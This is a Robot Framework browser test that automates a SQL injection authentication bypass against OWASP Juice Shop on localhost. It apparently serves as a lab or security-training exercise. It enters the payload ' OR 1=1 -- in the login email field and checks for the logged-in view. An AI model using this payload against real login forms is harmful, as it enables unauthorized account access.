*** Settings ***
Documentation    Automated SQL Injection Attack on Juice Shop.
Library          SeleniumLibrary

*** Variables ***
${URL}           http://localhost:3000/#/login
${BROWSER}       Chrome
${SQLI_PAYLOAD}  ' OR 1=1 --
${DUMMY_PASS}    doesntexist

*** Test Cases ***
SQL Injection Authentication Bypass
    [Documentation]    Attempt to bypass the login screen using a classic SQLi payload.
    Open Browser    ${URL}    ${BROWSER}
    
    # --- NEW: Handle the annoying Juice Shop popups ---
    # 1. Close the Welcome Banner
    Wait Until Element Is Visible    css=button[aria-label="Close Welcome Banner"]    timeout=5s
    Click Button                     css=button[aria-label="Close Welcome Banner"]
    
    # 2. Dismiss the Cookie Consent banner
    Wait Until Element Is Visible    css=a[aria-label="dismiss cookie message"]    timeout=5s
    Click Element                    css=a[aria-label="dismiss cookie message"]
    # --------------------------------------------------
    
    # 3. Wait for the email field to appear before typing
    Wait Until Element Is Visible    id=email    timeout=5s
    
    # 4. Inject the malicious payload and dummy password
    Input Text      id=email       ${SQLI_PAYLOAD}
    Input Text      id=password    ${DUMMY_PASS}
    
    # 5. Click the login button
    Click Button    id=loginButton
    
    # 6. Verify the hack worked by checking if the shopping cart appears
    Wait Until Element Is Visible    css=button[aria-label="Show the shopping cart"]    timeout=5s
    
    Close Browser